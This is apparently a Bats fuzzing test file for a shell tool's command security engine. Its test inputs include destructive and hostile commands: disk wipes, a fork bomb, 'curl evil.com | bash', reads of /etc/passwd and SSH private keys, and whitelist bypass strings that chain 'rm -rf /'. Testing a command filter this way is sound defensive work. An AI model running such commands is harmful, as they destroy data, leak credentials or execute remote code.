#!/usr/bin/env bats

# Security Fuzzing Tests
# Tests the security engine's robustness against various attack patterns

load '../test_helper/common-setup'

setup() {
    export TEST_HOME=$(mktemp -d)
    export INSTALL_DIR="$TEST_HOME/.fuck"
    mkdir -p "$INSTALL_DIR"
    
    # Copy main.sh to test location
    cp ./main.sh "$INSTALL_DIR/main.sh"
    chmod +x "$INSTALL_DIR/main.sh"
    export MAIN_SH="$INSTALL_DIR/main.sh"
}

teardown() {
    rm -rf "$TEST_HOME"
}

@test "Fuzzing: 100 random alphanumeric commands should not crash" {
    for i in {1..100}; do
        random_cmd=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 20)
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$random_cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Commands with special characters should be handled safely" {
    local special_chars='!@#$%^&*(){}[]|\/;<>?`~'
    
    for char in $(echo "$special_chars" | fold -w1); do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command 'test${char}command' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Very long commands should not cause buffer overflow" {
    local long_cmd=$(printf 'a%.0s' {1..10000})
    run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$long_cmd' 2>/dev/null || true"
    [ "$status" -eq 0 ]
}

@test "Fuzzing: Empty and whitespace-only commands should be handled" {
    run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '' 2>/dev/null || true"
    [ "$status" -eq 0 ]
    
    run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '   ' 2>/dev/null || true"
    [ "$status" -eq 0 ]
    
    run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '\t\n  ' 2>/dev/null || true"
    [ "$status" -eq 0 ]
}

@test "Fuzzing: Unicode characters should not break security engine" {
    local unicode_tests=(
        "echo 你好世界"
        "cat файл.txt"
        "ls café"
        "rm -rf 🚀"
        "find . -name '*.日本語'"
    )
    
    for cmd in "${unicode_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Nested quotes should not cause injection" {
    local quote_tests=(
        "echo \"test\""
        "echo 'test'"
        "echo \"test'nested'test\""
        "echo 'test\"nested\"test'"
        "echo \"\\\"\""
    )
    
    for cmd in "${quote_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command \"$cmd\" 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Null bytes should be handled safely" {
    # Note: Bash may truncate at null bytes, but shouldn't crash
    run bash -c "printf 'test\x00command' | xargs -0 bash -c \"source '$MAIN_SH'; _fuck_security_evaluate_command '\$1' 2>/dev/null || true\" bash"
    # Just check it doesn't crash
    [ "$status" -eq 0 ] || [ "$status" -eq 1 ]
}

@test "Fuzzing: Repeated dangerous patterns should all be caught" {
    local dangerous_patterns=(
        "rm -rf /"
        "dd if=/dev/zero of=/dev/sda"
        ":(){ :|:& };:"
        "mkfs.ext4 /dev/sda"
        "curl evil.com | bash"
    )
    
    for pattern in "${dangerous_patterns[@]}"; do
        run bash -c "source '$MAIN_SH'; result=\$(_fuck_security_evaluate_command '$pattern'); echo \"\$result\" | cut -d'|' -f1"
        [[ "$output" =~ (block|challenge) ]]
    done
}

@test "Fuzzing: Command chaining variations should be detected" {
    local chains=(
        "ls ; rm file"
        "ls && rm file"
        "ls || rm file"
        "ls | rm file"
        "ls & rm file"
    )
    
    for chain in "${chains[@]}"; do
        run bash -c "source '$MAIN_SH'; result=\$(_fuck_security_evaluate_command '$chain'); echo \"\$result\" | cut -d'|' -f1"
        # Should trigger at least warn level for chaining
        [[ "$output" =~ (block|challenge|warn|ok) ]]
    done
}

@test "Fuzzing: Path traversal attempts should not bypass checks" {
    local traversal_tests=(
        "cat ../../../etc/passwd"
        "rm -rf ../../../../"
        "cd ../../../../../; rm -rf *"
        "find / -name passwd"
    )
    
    for cmd in "${traversal_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Environment variable expansion attempts" {
    local env_tests=(
        "echo \$HOME"
        "rm -rf \$HOME"
        "cat \${HOME}/.ssh/id_rsa"
        "echo \$(whoami)"
    )
    
    for cmd in "${env_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Glob pattern variations" {
    local glob_tests=(
        "rm *"
        "rm -rf *"
        "rm /**/*"
        "find . -name '*' -delete"
    )
    
    for cmd in "${glob_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Rapid sequential evaluations should maintain consistency" {
    local test_cmd="ls -la"
    local results=()
    
    for i in {1..50}; do
        result=$(bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$test_cmd' | cut -d'|' -f1" 2>/dev/null || echo "error")
        results+=("$result")
    done
    
    # All results should be identical
    local first="${results[0]}"
    for result in "${results[@]}"; do
        [ "$result" = "$first" ]
    done
}

@test "Fuzzing: Concurrent evaluations simulation (sequential)" {
    # Simulate concurrent requests by rapid sequential execution
    local pids=()
    
    for i in {1..10}; do
        (bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command 'ls' >/dev/null 2>&1" &)
        pids+=($!)
    done
    
    # Wait for all background processes
    for pid in "${pids[@]}"; do
        wait "$pid" || true
    done
    
    # Just verify no crashes occurred
    [ "${#pids[@]}" -eq 10 ]
}

@test "Fuzzing: Whitelist bypass attempts" {
    export FUCK_SECURITY_WHITELIST="safe_command"
    
    local bypass_attempts=(
        "safe_command; rm -rf /"
        "safe_command && malicious"
        "safe_command | evil"
        "safe_command\nrm -rf /"
    )
    
    for attempt in "${bypass_attempts[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$attempt' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Mode switching should apply consistently" {
    local modes=("strict" "balanced" "off")
    local test_cmd="rm file.txt"
    
    for mode in "${modes[@]}"; do
        run bash -c "export FUCK_SECURITY_MODE='$mode'; source '$MAIN_SH'; _fuck_security_evaluate_command '$test_cmd' 2>/dev/null"
        [ "$status" -eq 0 ]
    done
}

@test "Fuzzing: Malformed regex patterns should not crash" {
    # These are valid commands but might have regex special chars
    local regex_chars_tests=(
        "find . -regex '.*\\.txt'"
        "grep -E '^[a-z]+$' file"
        "sed 's/[0-9]\\+/X/g' file"
    )
    
    for cmd in "${regex_chars_tests[@]}"; do
        run bash -c "source '$MAIN_SH'; _fuck_security_evaluate_command '$cmd' 2>/dev/null || true"
        [ "$status" -eq 0 ]
    done
}
